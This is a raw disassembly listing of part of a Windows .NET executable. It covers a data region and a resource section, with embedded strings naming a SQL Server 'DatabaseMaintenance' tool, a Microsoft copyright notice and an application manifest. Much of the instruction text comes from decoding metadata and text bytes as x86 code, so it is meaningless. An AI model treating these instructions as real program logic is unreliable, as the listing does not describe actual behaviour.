  404221:	add    BYTE PTR [ecx+0x0],dl
  404224:	dec    esp
  404225:	add    BYTE PTR [ecx],dh
  404227:	add    BYTE PTR [ecx],dh
  404229:	add    BYTE PTR [eax],dh
  40422b:	add    BYTE PTR [ebp+0x0],cl
  40422e:	push   ebx
  40422f:	add    BYTE PTR [ecx+0x0],cl
  404232:	push   ds
  404233:	push   ebx
  404234:	add    BYTE PTR [ecx+0x0],dl
  404237:	dec    esp
  404238:	add    BYTE PTR [ecx],dh
  40423a:	add    BYTE PTR [ecx],dh
  40423c:	add    BYTE PTR [eax],dh
  40423e:	add    BYTE PTR [ebp+0x0],al
  404241:	js     0x404243
  404243:	arpl   WORD PTR [eax],ax
  404245:	add    BYTE PTR gs:[eax+0x0],dh
  404249:	je     0x40424b
  40424b:	imul   eax,DWORD PTR [eax],0x6e006f
  404251:	sbb    BYTE PTR [ebx+edi*2+0x78003000],0x0
  404259:	xor    al,BYTE PTR [eax]
  40425b:	xor    al,0x0
  40425d:	xor    DWORD PTR [eax],eax
  40425f:	xor    al,0x0
  404261:	bound  eax,QWORD PTR [eax]
  404263:	arpl   WORD PTR [eax],ax
  404265:	xor    DWORD PTR [eax],eax
  404267:	bound  eax,QWORD PTR [eax]
  404269:	sub    al,0x0
  40426b:	and    BYTE PTR [eax],al
  40426d:	xor    BYTE PTR [eax],al
  40426f:	js     0x404271
  404271:	xor    DWORD PTR [eax],eax
  404273:	xor    eax,0x32003700
  404278:	add    BYTE PTR [eax+eax*1],ch
  40427b:	and    BYTE PTR [eax],al
  40427d:	xor    BYTE PTR [eax],al
  40427f:	js     0x404281
  404281:	xor    al,0x0
  404283:	arpl   WORD PTR [eax],ax
  404285:	add    BYTE PTR fs:[ecx],bh
  404288:	add    BYTE PTR [eax+eax*1],ch
  40428b:	and    BYTE PTR [eax],al
  40428d:	jnp    0x40428f
  40428f:	xor    BYTE PTR [eax],al
  404291:	js     0x404293
  404293:	cmp    DWORD PTR [eax],eax
  404295:	arpl   WORD PTR [eax],ax
  404297:	sub    al,0x0
  404299:	and    BYTE PTR [eax],al
  40429b:	xor    BYTE PTR [eax],al
  40429d:	js     0x40429f
  40429f:	popa   
  4042a0:	add    BYTE PTR ds:0x20002c00,dh
  4042a6:	add    BYTE PTR [eax],dh
  4042a8:	add    BYTE PTR [eax+0x0],bh
  4042ab:	add    BYTE PTR ss:0x20002c00,dh
  4042b2:	add    BYTE PTR [eax],dh
  4042b4:	add    BYTE PTR [eax+0x0],bh
  4042b7:	xor    DWORD PTR [eax],eax
  4042b9:	add    BYTE PTR ss:[eax+eax*1],ch
  4042bd:	and    BYTE PTR [eax],al
  4042bf:	xor    BYTE PTR [eax],al
  4042c1:	js     0x4042c3
  4042c3:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  4042c8:	add    BYTE PTR [eax],ah
  4042ca:	add    BYTE PTR [eax],dh
  4042cc:	add    BYTE PTR [eax+0x0],bh
  4042cf:	cmp    BYTE PTR [eax],al
  4042d1:	add    BYTE PTR fs:[eax+eax*1],ch
  4042d5:	and    BYTE PTR [eax],al
  4042d7:	xor    BYTE PTR [eax],al
  4042d9:	js     0x4042db
  4042db:	add    BYTE PTR gs:[esi+0x0],ah
  4042df:	sub    al,0x0
  4042e1:	and    BYTE PTR [eax],al
  4042e3:	xor    BYTE PTR [eax],al
  4042e5:	js     0x4042e7
  4042e7:	xor    eax,DWORD PTR [eax]
  4042e9:	add    BYTE PTR fs:[ebp+0x0],bh
  4042ed:	jge    0x4042ef
  4042ef:	sub    ch,BYTE PTR [ebp+0x0]
  4042f2:	jae    0x4042f4
  4042f4:	sub    eax,0x65006800
  4042f9:	add    BYTE PTR [eax+eax*1+0x70],ch
  4042fd:	add    BYTE PTR [edx],bh
  4042ff:	add    BYTE PTR [edi],ch
  404301:	add    BYTE PTR [edi],ch
  404303:	add    BYTE PTR [ebp+0x0],cl
  404306:	push   ebx
  404307:	add    BYTE PTR [esi],ch
  404309:	add    BYTE PTR [esi+0x0],dl
  40430c:	push   ebx
  40430d:	add    BYTE PTR [ebx+0x0],al
  404310:	inc    ebx
  404311:	add    BYTE PTR [esi],ch
  404313:	add    BYTE PTR [esi+0x0],dh
  404316:	cmp    DWORD PTR [eax],eax
  404318:	xor    BYTE PTR [eax],al
  40431a:	or     BYTE PTR [ecx],dh
  40431c:	add    BYTE PTR [eax],dh
  40431e:	add    BYTE PTR [esi],ch
  404320:	add    BYTE PTR [eax],dh
  404322:	add    BYTE PTR [ebx],al
  404324:	add    BYTE PTR [eax],al
  404326:	push   cs
  404327:	add    ecx,DWORD PTR [eax]
  404329:	add    BYTE PTR [esi],cl
  40432b:	add    al,0x20
  40432d:	add    DWORD PTR [ecx],eax
  40432f:	add    al,BYTE PTR [eax+eiz*1]
  404332:	add    DWORD PTR [ecx],eax
  404334:	push   cs
  404335:	add    eax,0x11010120
  40433a:	gs add eax,0x11010120
  404340:	jno    0x404346
  404342:	and    BYTE PTR [ecx],al
  404344:	add    DWORD PTR [eax],ecx
  404346:	and    BYTE PTR [eax+0x2400],0x4
  40434d:	add    BYTE PTR [eax],0x0
  404350:	xchg   esp,eax
  404351:	add    BYTE PTR [eax],al
  404353:	add    BYTE PTR [esi],al
  404355:	add    al,BYTE PTR [eax]
  404357:	add    BYTE PTR [eax],al
  404359:	and    al,0x0
  40435b:	add    BYTE PTR [edx+0x53],dl
  40435e:	inc    ecx
  40435f:	xor    DWORD PTR [eax],eax
  404361:	add    al,0x0
  404363:	add    BYTE PTR [ecx],al
  404365:	add    BYTE PTR [ecx],al
  404367:	add    BYTE PTR [edi],ah
  404369:	daa    
  40436a:	lods   eax,DWORD PTR ss:[esi]
  40436c:	outs   dx,BYTE PTR ds:[esi]
  40436d:	pop    edi
  40436e:	xchg   ebp,eax
  40436f:	xchg   BYTE PTR [edx-0x15ce2a3e],bh
  404375:	mov    esp,0x6c66cc3a
  40437a:	das    
  40437b:	mov    cs,eax
  40437d:	jns    0x404379
  40437f:	xchg   esp,eax
  404380:	clc    
  404381:	div    DWORD PTR [eax-0xdd082ce]
  404387:	in     eax,dx
  404388:	push   edx
  404389:	xor    al,0x48
  40438b:	clc    
  40438c:	cmp    al,0x3d
  40438e:	pop    esp
  40438f:	pop    ebp
  404390:	rcr    bh,cl
  404392:	(bad)  
  404393:	mov    esp,0x6b28c599
  404398:	sub    al,0x12
  40439a:	push   ecx
  40439b:	pop    ss
  40439c:	mov    edi,0x2b24be5c
  4043a1:	popf   
  4043a2:	inc    ecx
  4043a3:	jne    0x4043ac
  4043a5:	xor    dh,BYTE PTR [edx+0x49e6ffbd]
  4043ab:	(bad)  
  4043ac:	out    dx,eax
  4043ad:	mov    eax,0x526d52e5
  4043b2:	outs   dx,DWORD PTR ds:[esi]
  4043b3:	fst    QWORD PTR [ebx]
  4043b5:	add    BYTE PTR [ebp-0xd842414],dl
  4043bb:	adc    BYTE PTR [eax-0x27259364],al
  4043c1:	or     BYTE PTR [edi-0x56],0x9a
  4043c5:	shl    BYTE PTR [ecx],0xa
  4043c8:	ret    
  4043c9:	retf   
  4043ca:	mov    ds:0x562305aa,al
  4043cf:	jnp    0x4043fe
  4043d1:	cli    
  4043d2:	jg     0x4043b6
  4043d4:	push   eax
  4043d5:	mov    bl,0xf
  4043d7:	lods   al,BYTE PTR ds:[esi]
  4043d8:	mov    ebp,0x99ecd462
  4043dd:	mov    ecx,0x7d7cc44a
  4043e2:	cmp    ebp,DWORD PTR [eax]
  4043e4:	icebp  
  4043e5:	mul    ah
  4043e7:	enter  0x2007,0x2
  4043eb:	add    DWORD PTR [edx],edx
  4043ed:	or     eax,0x51112
  4043f2:	add    DWORD PTR [eax],ecx
  4043f4:	adc    BYTE PTR [eax],cl
  4043f6:	add    al,0x0
  4043f8:	add    DWORD PTR [ecx],eax
  4043fa:	or     BYTE PTR [eax],cl
  4043fc:	and    BYTE PTR ds:0xe0e0e01,al
  404402:	push   cs
  404403:	or     BYTE PTR [edi+eax*1],al
  404406:	add    DWORD PTR [edx],edx
  404408:	or     eax,0x1010005
  40440d:	adc    DWORD PTR ds:0x1020007,edx
  404413:	adc    BYTE PTR [eax],cl
  404415:	adc    BYTE PTR [eax],cl
  404417:	add    eax,0x11020100
  40441c:	adc    eax,0x1010005
  404421:	adc    cl,BYTE PTR ds:0x12002005
  404427:	or     BYTE PTR [ebp+0x1032006],0x8
  40442e:	or     BYTE PTR [eax],cl
  404430:	add    eax,0x80110000
  404435:	xchg   ebp,eax
  404436:	or     eax,DWORD PTR [eax]
  404438:	add    dl,BYTE PTR [ecx]
  40443a:	adc    BYTE PTR [ecx+0x11958011],0x80
  404441:	xchg   ebp,eax
  404442:	or     DWORD PTR [eax],eax
  404444:	add    al,BYTE PTR [edx]
  404446:	adc    DWORD PTR [eax-0x6e7fee6f],eax
  40444c:	add    eax,0x1d010120
  404451:	add    eax,0x1022005
  404456:	sbb    al,0x18
  404458:	pop    es
  404459:	add    BYTE PTR [edx],al
  40445b:	add    dl,BYTE PTR [edx]
  40445d:	sbb    BYTE PTR [ecx+0x3000b1c],0x1
  404464:	adc    cl,BYTE PTR ds:0x119d8012
  40446a:	and    BYTE PTR [ecx+0x80d071d],0x8
  404471:	adc    cl,BYTE PTR ds:0x8121112
  404477:	adc    DWORD PTR [eax-0x6a7fee6f],eax
  40447d:	adc    cl,BYTE PTR [eax+ecx*1]
  404480:	adc    cl,BYTE PTR ds:0x12918011
  404486:	sbb    BYTE PTR [ebp+0x20050d12],0x1
  40448d:	adc    dl,BYTE PTR [ecx]
  40448f:	or     BYTE PTR [edi],cl
  404491:	pop    es
  404492:	add    eax,0x80121112
  404497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404498:	adc    al,BYTE PTR [eax-0x627fed53]
  40449e:	adc    dl,BYTE PTR [ecx]
  4044a0:	add    al,0x20
  4044a2:	add    BYTE PTR [edx],dl
  4044a4:	adc    DWORD PTR ds:0x80110020,eax
  4044aa:	mov    ecx,0x12002004
  4044af:	or     eax,0x11002005
  4044b4:	cmp    BYTE PTR [ebp+0x1022008],0x12
  4044bb:	sbb    DWORD PTR [ecx],edx
  4044bd:	cmp    BYTE PTR [ebp+0x12012006],0x19
  4044c4:	adc    cl,BYTE PTR [ecx]
  4044c6:	adc    eax,0x8120707
  4044cb:	adc    al,BYTE PTR [eax+0x121912c1]
  4044d1:	sbb    BYTE PTR [ebp+0x129d8012],0x80
  4044d8:	popf   
  4044d9:	adc    al,BYTE PTR [eax+0x100049d]
  4044df:	or     BYTE PTR [esi],cl
  4044e1:	or     BYTE PTR [eax+0x117f5f3f],dh
  4044e7:	aad    0xa
  4044e9:	cmp    al,BYTE PTR ds:0x80120000
  4044ef:	int    0x4
  4044f1:	and    BYTE PTR [ecx],al
  4044f3:	push   cs
  4044f4:	push   cs
  4044f5:	add    esp,DWORD PTR [eax]
  4044f7:	add    BYTE PTR [esi],cl
  4044f9:	or     BYTE PTR [eax],al
  4044fb:	add    ecx,DWORD PTR [eax]
  4044fd:	push   cs
  4044fe:	push   cs
  4044ff:	adc    DWORD PTR [eax+0x10004d5],eax
  404505:	add    DWORD PTR [esi],ecx
  404507:	push   cs
  404508:	pop    es
  404509:	pop    es
  40450a:	push   cs
  40450b:	push   cs
  40450c:	or     BYTE PTR [ecx],dl
  40450e:	adc    eax,0x1012051d
  404513:	adc    al,BYTE PTR [eax+0x100049d]
  404519:	add    cl,BYTE PTR [esi]
  40451b:	add    esp,DWORD PTR [eax]
  40451d:	add    BYTE PTR [eax],cl
  40451f:	add    eax,0x80e0220
  404524:	or     BYTE PTR ds:0x80120000,al
  40452a:	in     eax,0x5
  40452c:	and    BYTE PTR [eax],al
  40452e:	adc    al,BYTE PTR [eax+0x3000ae9]
  404534:	add    eax,0xed80110e
  404539:	adc    al,BYTE PTR [eax+0x20704f1]
  40453f:	or     BYTE PTR [eax],cl
  404541:	add    eax,0x10001
  404546:	add    BYTE PTR [ecx],bl
  404548:	add    DWORD PTR [eax],eax
  40454a:	adc    al,0x44
  40454c:	popa   
  40454d:	je     0x4045b0
  40454f:	bound  esp,QWORD PTR [ecx+0x73]
  404552:	and    BYTE PTR gs:[ebp+0x61],cl
  404556:	imul   ebp,DWORD PTR [eax+eiz*1+0x65],0x6e69676e
  40455e:	add    BYTE PTR gs:[eax],al
  404561:	sub    DWORD PTR [ecx],eax
  404563:	add    BYTE PTR [ecx*2+0x6f726369],ah
  40456a:	jae    0x4045db
  40456c:	data16 je 0x40458f
  40456f:	inc    ebx
  404570:	outs   dx,DWORD PTR ds:[esi]
  404571:	jb     0x4045e3
  404573:	and    BYTE PTR cs:[ecx+0x6c],al
  404577:	ins    BYTE PTR es:[edi],dx
  404578:	and    BYTE PTR [edx+0x69],dh
  40457b:	addr16 push 0x72207374
  404581:	gs jae 0x4045e9
  404584:	jb     0x4045fc
  404586:	gs fs add BYTE PTR cs:[eax],al
  40458b:	sbb    al,BYTE PTR [ecx]
  40458d:	add    BYTE PTR ds:0x7263694d,dl
  404593:	outs   dx,DWORD PTR ds:[esi]
  404594:	jae    0x404605
  404596:	data16 je 0x4045b9
  404599:	inc    ebx
  40459a:	outs   dx,DWORD PTR ds:[esi]
  40459b:	jb     0x40460d
  40459d:	outs   dx,DWORD PTR ds:[esi]
  40459e:	jb     0x404601
  4045a0:	je     0x40460b
  4045a2:	outs   dx,DWORD PTR ds:[esi]
  4045a3:	outs   dx,BYTE PTR ds:[esi]
  4045a4:	add    BYTE PTR [eax],al
  4045a6:	sub    al,0x1
  4045a8:	add    BYTE PTR [edi],ah
  4045aa:	xor    DWORD PTR [ecx],esi
  4045ac:	xor    BYTE PTR cs:[esi],ch
  4045af:	xor    dh,BYTE PTR [ecx]
  4045b1:	xor    BYTE PTR [eax],dh
  4045b3:	cs xor BYTE PTR ss:[eax],ah
  4045b7:	sub    BYTE PTR [eax],ch
  4045b9:	push   ebx
  4045ba:	push   ecx
  4045bb:	dec    esp
  4045bc:	xor    DWORD PTR [ecx],esi
  4045be:	pop    edi
  4045bf:	push   edx
  4045c0:	push   esp
  4045c1:	dec    ebp
  4045c2:	sub    DWORD PTR [esi],ebp
  4045c4:	xor    DWORD PTR [edx],esi
  4045c6:	xor    BYTE PTR [edx],dh
  4045c8:	xor    DWORD PTR [eax],esi
  4045ca:	sub    eax,0x37313931
  4045cf:	and    BYTE PTR [ecx],ch
  4045d1:	add    BYTE PTR [eax],al
  4045d3:	adc    DWORD PTR [ecx],eax
  4045d5:	add    BYTE PTR [ecx+esi*1],cl
  4045d8:	xor    DWORD PTR [esi],ebp
  4045da:	xor    BYTE PTR [esi],ch
  4045dc:	xor    dh,BYTE PTR [ecx]
  4045de:	xor    BYTE PTR [eax],dh
  4045e0:	cs xor BYTE PTR ss:[eax],al
  4045e4:	add    BYTE PTR ds:0x65300001,dh
  4045ea:	cmp    bl,BYTE PTR [ebx+esi*2+0x71]
  4045ee:	ins    BYTE PTR es:[edi],dx
  4045ef:	xor    DWORD PTR [ecx],esi
  4045f1:	pop    edi
  4045f2:	ins    DWORD PTR es:[edi],dx
  4045f3:	popa   
  4045f4:	imul   ebp,DWORD PTR [esi+0x5f],0x735c5c74
  4045fb:	jno    0x404669
  4045fd:	pop    esp
  4045fe:	inc    ebx
  4045ff:	outs   dx,DWORD PTR ds:[esi]
  404600:	ins    DWORD PTR es:[edi],dx
  404601:	ins    DWORD PTR es:[edi],dx
  404602:	outs   dx,DWORD PTR ds:[esi]
  404603:	outs   dx,BYTE PTR ds:[esi]
  404604:	pop    esp
  404605:	push   ebx
  404606:	dec    esi
  404607:	dec    ebx
  404608:	pop    esp
  404609:	push   ebx
  40460a:	push   ecx
  40460b:	dec    esp
  40460c:	xor    dh,BYTE PTR [eax]
  40460e:	xor    BYTE PTR [ebx],dh
  404610:	push   ebx
  404611:	dec    esi
  404612:	dec    ebx
  404613:	inc    ebp
  404614:	pop    ecx
  404615:	cs jae 0x404686
  404618:	imul   eax,DWORD PTR [eax],0x0
  40461b:	dec    ebp
  40461c:	add    DWORD PTR [eax],eax
  40461e:	dec    eax
  40461f:	dec    ebp
  404620:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404627:	je     0x404649
  404629:	push   ebx
  40462a:	push   ecx
  40462b:	dec    esp
  40462c:	and    BYTE PTR [ebx+0x65],dl
  40462f:	jb     0x4046a7
  404631:	gs jb  0x404654
  404634:	imul   esi,DWORD PTR [ebx+0x20],0x65722061
  40463b:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  404643:	and    BYTE PTR [edx+esi*2+0x61],dh
  404647:	fs gs ins DWORD PTR es:[edi],dx
  40464a:	popa   
  40464b:	jb     0x4046b8
  40464d:	and    BYTE PTR [edi+0x66],ch
  404650:	and    BYTE PTR [ebp+0x69],cl
  404653:	arpl   WORD PTR [edx+0x6f],si
  404656:	jae    0x4046c7
  404658:	data16 je 0x40467b
  40465b:	inc    ebx
  40465c:	outs   dx,DWORD PTR ds:[esi]
  40465d:	jb     0x4046cf
  40465f:	outs   dx,DWORD PTR ds:[esi]
  404660:	jb     0x4046c3
  404662:	je     0x4046cd
  404664:	outs   dx,DWORD PTR ds:[esi]
  404665:	outs   dx,BYTE PTR ds:[esi]
  404666:	add    BYTE PTR cs:[eax],al
  404669:	add    eax,0x1
  40466e:	add    BYTE PTR [edx],cl
  404670:	add    DWORD PTR [eax],eax
  404672:	add    eax,0x552d6e65
  404677:	push   ebx
  404678:	add    BYTE PTR [eax],al
  40467a:	or     BYTE PTR [ecx],al
  40467c:	add    BYTE PTR [edx],al
  40467e:	add    BYTE PTR [eax],al
  404680:	add    BYTE PTR [eax],al
  404682:	add    BYTE PTR [eax],cl
  404684:	add    DWORD PTR [eax],eax
  404686:	or     BYTE PTR [eax],al
  404688:	add    BYTE PTR [eax],al
  40468a:	add    BYTE PTR [eax],al
  40468c:	push   ds
  40468d:	add    DWORD PTR [eax],eax
  40468f:	add    DWORD PTR [eax],eax
  404691:	push   esp
  404692:	add    dl,BYTE PTR [esi]
  404694:	push   edi
  404695:	jb     0x4046f8
  404697:	jo     0x4046e7
  404699:	outs   dx,DWORD PTR ds:[esi]
  40469a:	outs   dx,BYTE PTR ds:[esi]
  40469b:	inc    ebp
  40469c:	js     0x404701
  40469e:	gs jo  0x404715
  4046a1:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  4046a8:	ja     0x40471d
  4046aa:	add    DWORD PTR [eax-0x7ffed167],eax
  4046b0:	xchg   DWORD PTR [ebx+0x79],edx
  4046b3:	jae    0x404729
  4046b5:	gs ins DWORD PTR es:[edi],dx
  4046b7:	cs push ebx
  4046b9:	arpl   WORD PTR gs:[ebp+0x72],si
  4046bd:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  4046c5:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  4046cc:	cs inc ebp
  4046ce:	outs   dx,BYTE PTR ds:[esi]
  4046cf:	jbe    0x40473a
  4046d1:	jb     0x404742
  4046d3:	outs   dx,BYTE PTR ds:[esi]
  4046d4:	ins    DWORD PTR es:[edi],dx
  4046d5:	outs   dx,BYTE PTR gs:[esi]
  4046d7:	je     0x404729
  4046d9:	gs jb  0x404749
  4046dc:	imul   esi,DWORD PTR [ebx+0x73],0x416e6f69
  4046e3:	je     0x404759
  4046e5:	jb     0x404750
  4046e7:	bound  esi,QWORD PTR [ebp+0x74]
  4046ea:	gs sub al,0x20
  4046ed:	ins    DWORD PTR es:[edi],dx
  4046ee:	jae    0x404753
  4046f0:	outs   dx,DWORD PTR ds:[esi]
  4046f1:	jb     0x40475f
  4046f3:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4046fa:	jae    0x404765
  4046fc:	outs   dx,DWORD PTR ds:[esi]
  4046fd:	outs   dx,BYTE PTR ds:[esi]
  4046fe:	cmp    eax,0x2e302e32
  404703:	xor    BYTE PTR [esi],ch
  404705:	xor    BYTE PTR [eax+eiz*1],ch
  404708:	inc    ebx
  404709:	jne    0x404777
  40470b:	je     0x404782
  40470d:	jb     0x404774
  40470f:	cmp    eax,0x7475656e
  404714:	jb     0x404777
  404716:	ins    BYTE PTR es:[edi],dx
  404717:	sub    al,0x20
  404719:	push   eax
  40471a:	jne    0x40477e
  40471c:	ins    BYTE PTR es:[edi],dx
  40471d:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404724:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  404728:	bound  esi,QWORD PTR [edi]
  40472a:	aaa    
  40472b:	popa   
  40472c:	xor    eax,0x31363563
  404731:	cmp    DWORD PTR [ebx],esi
  404733:	xor    al,0x65
  404735:	xor    BYTE PTR [eax],bh
  404737:	cmp    DWORD PTR ds:0x40e5401,ecx
  40473d:	push   edx
  40473e:	gs popa 
  404740:	fs add al,0x54
  404743:	inc    ebp
  404744:	dec    ebp
  404745:	push   eax
  404746:	add    BYTE PTR [eax],al
  404748:	add    BYTE PTR [eax],al
  40474a:	add    BYTE PTR [eax],al
  40474c:	mov    eax,ds:0x4f35e1
  404751:	add    BYTE PTR [eax],al
  404753:	add    BYTE PTR [edx],al
  404755:	add    BYTE PTR [eax],al
  404757:	add    BYTE PTR [ecx],ch
  404759:	add    BYTE PTR [eax],al
  40475b:	add    BYTE PTR [edi+eax*2+0x0],ah
  40475f:	add    BYTE PTR [edi+esi*1+0x0],ah
  404763:	add    BYTE PTR [edx+0x53],dl
  404766:	inc    esp
  404767:	push   ebx
  404768:	xor    eax,0xa7da90bc
  40476d:	loope  0x404765
  40476f:	inc    ebp
  404770:	mov    dl,0xea
  404772:	ror    dl,1
  404774:	aas    
  404775:	test   al,0x3
  404777:	sub    al,0x1
  404779:	add    BYTE PTR [eax],al
  40477b:	add    BYTE PTR [ecx+eiz*2+0x74],al
  40477f:	popa   
  404780:	bound  esp,QWORD PTR [ecx+0x73]
  404783:	gs dec ebp
  404785:	popa   
  404786:	imul   ebp,DWORD PTR [esi+ebp*1+0x70],0x6264
	...
  4047de:	add    BYTE PTR [eax],al
  4047e0:	or     BYTE PTR [eax+0x0],cl
	...
  4047eb:	add    BYTE PTR [esi],bl
  4047ed:	dec    eax
  4047ee:	add    BYTE PTR [eax],al
  4047f0:	add    BYTE PTR [eax],ah
	...
  404806:	add    BYTE PTR [eax],al
  404808:	adc    BYTE PTR [eax+0x0],cl
  40480b:	add    BYTE PTR [eax],al
  40480d:	add    BYTE PTR [eax],al
  40480f:	add    BYTE PTR [eax],al
  404811:	add    BYTE PTR [edi+0x43],bl
  404814:	outs   dx,DWORD PTR ds:[esi]
  404815:	jb     0x40485c
  404817:	js     0x40487e
  404819:	dec    ebp
  40481a:	popa   
  40481b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  404822:	jb     0x404889
  404824:	gs cs fs ins BYTE PTR es:[edi],dx
  404828:	ins    BYTE PTR es:[edi],dx
  404829:	add    BYTE PTR [eax],al
  40482b:	add    BYTE PTR [eax],al
  40482d:	add    bh,bh
  40482f:	and    eax,0x402000

Disassembly of section .rsrc:

00406000 <.rsrc>:
	...
  40600c:	add    BYTE PTR [eax],al
  40600e:	add    al,BYTE PTR [eax]
  406010:	adc    BYTE PTR [eax],al
  406012:	add    BYTE PTR [eax],al
  406014:	and    BYTE PTR [eax],al
  406016:	add    BYTE PTR [eax+0x18],al
  40601c:	cmp    BYTE PTR [eax],al
  40601e:	add    BYTE PTR [eax+0x0],al
	...
  40602c:	add    BYTE PTR [eax],al
  40602e:	add    DWORD PTR [eax],eax
  406030:	add    DWORD PTR [eax],eax
  406032:	add    BYTE PTR [eax],al
  406034:	push   eax
  406035:	add    BYTE PTR [eax],al
  406037:	add    BYTE PTR [eax],0x0
	...
  406046:	add    DWORD PTR [eax],eax
  406048:	add    DWORD PTR [eax],eax
  40604a:	add    BYTE PTR [eax],al
  40604c:	push   0x800000
	...
  40605d:	add    BYTE PTR [ecx],al
  40605f:	add    BYTE PTR [ecx],cl
  406061:	add    al,0x0
  406063:	add    BYTE PTR [eax+0x0],al
	...
  406075:	add    BYTE PTR [ecx],al
  406077:	add    BYTE PTR [ecx],cl
  406079:	add    al,0x0
  40607b:	add    BYTE PTR [eax+0x48000000],dl
  406081:	arpl   WORD PTR [eax],ax
  406083:	add    BYTE PTR [esp+eax*1+0x0],bl
  40608a:	add    BYTE PTR [eax],al
  40608c:	add    BYTE PTR [eax],al
  40608e:	add    BYTE PTR [eax],al
  406090:	mov    al,ds:0xa8000060
  406095:	add    al,BYTE PTR [eax]
	...
  40609f:	add    BYTE PTR [edi+edi*1],bh
  4060a2:	js     0x406111
  4060a4:	ins    BYTE PTR es:[edi],dx
  4060a5:	and    BYTE PTR [esi+0x65],dh
  4060a8:	jb     0x40611d
  4060aa:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4060b1:	xor    BYTE PTR [edx],ah
  4060b3:	and    BYTE PTR [ebp+0x6e],ah
  4060b6:	arpl   WORD PTR [edi+0x64],bp
  4060b9:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  4060c0:	inc    esi
  4060c1:	sub    eax,0x73202238
  4060c6:	je     0x406129
  4060c8:	outs   dx,BYTE PTR ds:[esi]
  4060c9:	fs popa 
  4060cb:	ins    BYTE PTR es:[edi],dx
  4060cc:	outs   dx,DWORD PTR ds:[esi]
  4060cd:	outs   dx,BYTE PTR ds:[esi]
  4060ce:	gs cmp eax,0x73657922
  4060d4:	and    bh,BYTE PTR [edi]
  4060d6:	ds or  eax,0x2d213c0a
  4060dc:	sub    eax,0x706f4320
  4060e1:	jns    0x406155
  4060e3:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  4060ea:	sub    DWORD PTR [eax],esp
  4060ec:	dec    ebp
  4060ed:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4060f4:	je     0x406116
  4060f6:	inc    ebx
  4060f7:	outs   dx,DWORD PTR ds:[esi]
  4060f8:	jb     0x40616a
  4060fa:	outs   dx,DWORD PTR ds:[esi]
  4060fb:	jb     0x40615e
  4060fd:	je     0x406168
  4060ff:	outs   dx,DWORD PTR ds:[esi]
  406100:	outs   dx,BYTE PTR ds:[esi]
  406101:	and    BYTE PTR ds:0xa0d3e2d,ch
  406107:	cmp    al,0x61
  406109:	jae    0x40617e
  40610b:	gs ins DWORD PTR es:[edi],dx
  40610d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  406111:	js     0x406180
  406113:	ins    BYTE PTR es:[edi],dx
  406114:	outs   dx,BYTE PTR ds:[esi]
  406115:	jae    0x406154
  406117:	and    dh,BYTE PTR [ebp+0x72]
  40611a:	outs   dx,BYTE PTR ds:[esi]
  40611b:	cmp    dh,BYTE PTR [ebx+0x63]
  40611e:	push   0x73616d65
  406123:	sub    eax,0x7263696d
  406128:	outs   dx,DWORD PTR ds:[esi]
  406129:	jae    0x40619a
  40612b:	data16 je 0x40615b
  40612e:	arpl   WORD PTR [edi+0x6d],bp
  406131:	cmp    ah,BYTE PTR [ecx+0x73]
  406134:	ins    DWORD PTR es:[edi],dx
  406135:	cs jbe 0x406169
  406138:	and    cl,BYTE PTR ds:0x616d200a
  40613e:	outs   dx,BYTE PTR ds:[esi]
  40613f:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  406146:	jb     0x4061bb
  406148:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40614f:	xor    BYTE PTR [edx],ah
  406151:	and    BYTE PTR ds:0x3c20200a,cl
  406158:	popa   
  406159:	jae    0x4061ce
  40615b:	gs ins DWORD PTR es:[edi],dx
  40615d:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  406161:	fs outs dx,BYTE PTR gs:[esi]
  406164:	je     0x4061cf
  406166:	je     0x4061e1
  406168:	and    BYTE PTR [esi+0x65],dh
  40616b:	jb     0x4061e0
  40616d:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  406174:	xor    BYTE PTR [esi],ch
  406176:	xor    BYTE PTR [esi],ch
  406178:	xor    BYTE PTR [edx],ah
  40617a:	or     eax,0x2020200a
  40617f:	and    BYTE PTR [eax],ah
  406181:	outs   dx,BYTE PTR ds:[esi]
  406182:	popa   
  406183:	ins    DWORD PTR es:[edi],dx
  406184:	gs cmp eax,0x74614422
  40618a:	popa   
  40618b:	bound  esp,QWORD PTR [ecx+0x73]
  40618e:	gs dec ebp
  406190:	popa   
  406191:	imul   ebp,DWORD PTR [edx+eiz*1+0xd],0x2020200a
  406199:	and    BYTE PTR [eax],ah
  40619b:	je     0x406216
  40619d:	jo     0x406204
  40619f:	cmp    eax,0x6e697722
  4061a4:	xor    esi,DWORD PTR [edx]
  4061a6:	and    ch,BYTE PTR [edi]
  4061a8:	and    BYTE PTR ds:0x200a0d0a,cl
  4061af:	and    BYTE PTR [esp+eiz*2],bh
  4061b2:	gs jae 0x406218
  4061b5:	jb     0x406220
  4061b7:	jo     0x40622d
  4061b9:	imul   ebp,DWORD PTR [edi+0x6e],0x7461443e
  4061c0:	popa   
  4061c1:	bound  esp,QWORD PTR [ecx+0x73]
  4061c4:	gs dec ebp
  4061c6:	popa   
  4061c7:	imul   ebp,DWORD PTR [eax+eiz*1+0x2d],0x4c515320
  4061cf:	and    BYTE PTR [ebx+0x65],dl
  4061d2:	jb     0x40624a
  4061d4:	gs jb  0x4061f7
  4061d7:	inc    esp
  4061d8:	popa   
  4061d9:	je     0x40623c
  4061db:	bound  esp,QWORD PTR [ecx+0x73]
  4061de:	and    BYTE PTR gs:[ebp+0x61],cl
  4061e2:	imul   ebp,DWORD PTR [esp+edi*1+0x2f],0x63736564
  4061ea:	jb     0x406255
  4061ec:	jo     0x406262
  4061ee:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d203e
